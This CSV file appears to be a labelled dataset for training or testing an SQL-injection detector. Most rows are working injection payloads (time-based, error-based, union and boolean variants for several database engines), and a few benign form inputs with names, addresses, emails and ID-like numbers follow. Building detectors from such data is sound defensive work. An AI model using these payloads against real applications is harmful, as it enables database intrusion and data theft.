payload,label,attack_type
"1%"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
1';select sleep(5)#,malicious,sqli
1')) as xkiq where 9008=9008 and sleep(5)--,malicious,sqli
"1"" where 2235=2235 union all select null,null,null,null,null--",malicious,sqli
"1%"" and 6969=(select 6969 from pg_sleep(5)) and ""%""=""",malicious,sqli
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",malicious,sqli
1' where 8159=8159 union all select null#,malicious,sqli
"1) as qjjm where 3850=3850 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"-3924'||(select 'ssld' from dual where 6229=6229 union all select 6229,6229,6229,6229,6229#",malicious,sqli
"1%""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""%""=""",malicious,sqli
-7758%'))) or 3038=3038,malicious,sqli
"1%""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""%""=""",malicious,sqli
"1%')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",malicious,sqli
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"-5780 or make_set(3464=4518,4518)-- icit",malicious,sqli
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('jmjw' like 'jmjw",malicious,sqli
"-7700%') union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",malicious,sqli
-1127 or 7391=4954,malicious,sqli
-8876')) or 3038=3038,malicious,sqli
"-1218' union all select 2663,2663,2663,2663--",malicious,sqli
"-9583')) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",malicious,sqli
"-1663' or elt(1032=1032,3623) and 'yqaj' like 'yqaj",malicious,sqli
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
1) and 3861=5813--,malicious,sqli
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",malicious,sqli
"-4639""))) or 8550=9348",malicious,sqli
-3246%' union all select 4012#,malicious,sqli
"1"") where 2088=2088 union all select null,null,null,null--",malicious,sqli
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",malicious,sqli
"1'))) union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
-7277))) order by 1#,malicious,sqli
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",malicious,sqli
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'efpc' like 'efpc",malicious,sqli
1'))) and 7533=7533 and ((('txex'='txex,malicious,sqli
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
1;select pg_sleep(5),malicious,sqli
"1%';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
1')) as wuws where 6917=6917 union all select null#,malicious,sqli
"1') as bxae where 4143=4143 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",malicious,sqli
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",malicious,sqli
-9673) or 8571=8571--,malicious,sqli
"1%"" and 2006=2006",malicious,sqli
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",malicious,sqli
-5031' or 9323=9323#,malicious,sqli
"-9638))) or elt(1032=1032,3623) and (((3679=3679",malicious,sqli
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,malicious,sqli
1 rlike (select (case when (8911=5301) then 1 else 0x28 end))# pmuh,malicious,sqli
1'));select pg_sleep(5) and (('enpn' like 'enpn,malicious,sqli
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
-4171') union all select 6136#,malicious,sqli
"1)) as aqpy where 4027=4027 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))-- sbvl",malicious,sqli
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((8679=8679",malicious,sqli
"-5624' union all select 3723,3723,3723,3723,3723--",malicious,sqli
"1"")));iif(1718=5436,1,1/0)",malicious,sqli
1%') waitfor delay '0:0:5'--,malicious,sqli
"1'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"") where 8098=8098;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",malicious,sqli
"1%')) and make_set(6527=9529,9529) and (('%'='",malicious,sqli
"1%'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('fuyl'='fuyl",malicious,sqli
-3535%'))) or 5605=4660 and ((('%'=',malicious,sqli
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",malicious,sqli
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1"") or elt(6272=6272,sleep(5)) and (""dplf"" like ""dplf",malicious,sqli
"-2605"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""cikb"" like ""cikb",malicious,sqli
"1')) union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"1"") where 6065=6065 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"-7551 or elt(6900=7195,7195)",malicious,sqli
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"-9135"")) or 6872=6872 and ((""fllx""=""fllx",malicious,sqli
"1"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,sqli
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,malicious,sqli
-8163)) as cvai where 2360=2360 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
1) where 1100=1100 and sleep(5)--,malicious,sqli
"1%""))) or (select * from (select(sleep(5)))sddo)#",malicious,sqli
1') as jztg where 1222=1222 or sleep(5)#,malicious,sqli
1) where 9078=9078 rlike sleep(5)#,malicious,sqli
1' in boolean mode) waitfor delay '0:0:5'#,malicious,sqli
1') as fxid where 5926=5926;if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
"1""));begin dbms_lock.sleep(5); end--",malicious,sqli
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1'||(select 'wvio' from dual where 8934=8934 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
"1"" where 9521=9521 or (select * from (select(sleep(5)))ydpu)--",malicious,sqli
1%') union all select null--,malicious,sqli
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",malicious,sqli
-4644 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')# upwd,malicious,sqli
-4494 or 5291=4452,malicious,sqli
"1) as qzif where 7877=7877 union all select null,null,null,null,null,null,null--",malicious,sqli
"1'+(select vfmy where 5711=5711;iif(5214=7412,1,1/0)",malicious,sqli
"1'+(select 'ayod' where 7839=7839 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",malicious,sqli
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",malicious,sqli
1)) as xlww where 5844=5844;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,malicious,sqli
"1"") union all select null,null,null,null,null--",malicious,sqli
"1%') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
"1)) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((5349=5349",malicious,sqli
"1') and 8407=(select count(*) from generate_series(1,5000000))",malicious,sqli
"1);select count(*) from generate_series(1,5000000)--",malicious,sqli
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
1') rlike (select * from (select(sleep(5)))sgvo) and ('lzbn'='lzbn,malicious,sqli
"-5817' in boolean mode) union all select 2391,2391,2391,2391,2391--",malicious,sqli
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,sqli
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
1%') and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",malicious,sqli
1') or 6793=(select 6793 from pg_sleep(5)) and ('fuvv'='fuvv,malicious,sqli
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",malicious,sqli
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",malicious,sqli
1');select pg_sleep(5),malicious,sqli
"1"" where 8089=8089;iif(5257=5257,1,1/0)",malicious,sqli
"1%"") and 4595=4595#",malicious,sqli
"-3769""))) union all select 8456#",malicious,sqli
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",malicious,sqli
"1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",malicious,sqli
1%'));if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
"1')));select count(*) from generate_series(1,5000000)--",malicious,sqli
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1""))) and 7135=8805#",malicious,sqli
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",malicious,sqli
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",malicious,sqli
"1%') union all select null,null,null,null,null#",malicious,sqli
"1%'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
1')) as vnwn where 8774=8774 and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
1') rlike (select (case when (2671=4485) then 1 else 0x28 end)) and ('ezco' like 'ezco,malicious,sqli
"-9023%""))) union all select 4490,4490,4490#",malicious,sqli
"1) as attr where 8085=8085 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1"" where 7022=7022;select (case when (7822=4430) then 7822 else 1/(select 0) end)--",malicious,sqli
(select (case when (7018=7018) then 7018 else 7018*(select 7018 from master..sysdatabases) end)),malicious,sqli
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)-- xsob",malicious,sqli
"1')) as uuuk where 7234=7234 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",malicious,sqli
"1')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1' in boolean mode) union all select null,null,null,null,null,null,null--",malicious,sqli
"1%"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""%""=""",malicious,sqli
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs",malicious,sqli
"1%"")));begin user_lock.sleep(5); end and (((""%""=""",malicious,sqli
"-1171' union all select 3958,3958,3958,3958,3958--",malicious,sqli
1 and 7533=7533# absp,malicious,sqli
"1%' and elt(3114=3114,sleep(5))#",malicious,sqli
"1%"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",malicious,sqli
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",malicious,sqli
"-3667%')) union all select 3560,3560,3560--",malicious,sqli
"1%"" and (2850=6610)*6610 and ""%""=""",malicious,sqli
3,benign,norm
100,benign,norm
55,benign,norm
entrar,benign,norm
choong,benign,norm
off,benign,norm
2,benign,norm
insertar,benign,norm
2672,benign,norm
registro,benign,norm
cen,benign,norm
nurit,benign,norm
ferrandez cabaas,benign,norm
17621392b,benign,norm
calle clavel 30 11?b,benign,norm
17463,benign,norm
cceres,benign,norm
registrar,benign,norm
vaciar carrito,benign,norm
rodern,benign,norm
franklin,benign,norm
pockaj-bushman@lecriture.md,benign,norm
29283698y,benign,norm
tirapu,benign,norm
25320,benign,norm
4789967077221120,benign,norm
queso manchego,benign,norm
1an0re5354,benign,norm
1,benign,norm
francois,benign,norm
patay,benign,norm
rofes,benign,norm
brando@elsentidodelavida.lc,benign,norm
hoyo higueron 32 3-f,benign,norm
